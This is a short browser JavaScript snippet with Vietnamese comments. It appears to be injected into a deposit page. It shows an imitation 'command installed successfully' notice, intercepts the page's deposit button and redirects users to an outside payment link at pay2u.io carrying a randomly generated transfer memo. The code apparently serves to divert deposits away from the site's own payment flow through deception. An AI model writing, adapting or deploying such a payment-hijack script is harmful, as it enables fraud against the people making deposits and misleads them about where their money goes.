(function() {
    // 1. Tạo nội dung chuyển khoản ngẫu nhiên từ 7 đến 10 ký tự
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const length = Math.floor(Math.random() * 4) + 7; 
    let memo = '';
    for (let i = 0; i < length; i++) {
        memo += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    // 2. Đường dẫn trang nạp tiền mục tiêu của bạn
    // Sửa lỗi: thay khoảng trắng bằng dấu hỏi để bắt đầu query string và mã hóa memo
    const finalUrl = `https://pay2u.io?THE_TRONG&memo=${encodeURIComponent(memo)}`;

    function init() {
        // 3. Tạo và hiển thị thông báo đen "cài lệnh thành công" giống hệt ảnh mẫu
        const toast = document.createElement('div');
        toast.setAttribute('role', 'status');
        toast.setAttribute('aria-live', 'polite');
        toast.style.cssText = "position:fixed;bottom:30%;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.85);color:#fff;padding:12px 24px;border-radius:20px;font-size:15px;z-index:999999;box-shadow:0 2px 10px rgba(0,0,0,0.3);font-family:Arial,Helvetica,sans-serif;text-align:center;";
        toast.innerHTML = "cài lệnh thành công";
        document.body.appendChild(toast);

        // Giữ thông báo hiển thị cố định trong 5 phút (300.000 ms)
        setTimeout(() => { toast.remove(); }, 300000);

        // 4. Lắng nghe sự kiện click: Khi người dùng bấm nút "Nạp Tiền Ngay" mới bắt đầu chuyển hướng
        const btn = document.querySelector("#depositSubmitClick");
        if (btn) {
            btn.addEventListener('click', (e) => {
                e.preventDefault();
                // chuyển hướng đến finalUrl
                window.location.href = finalUrl;
            });
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
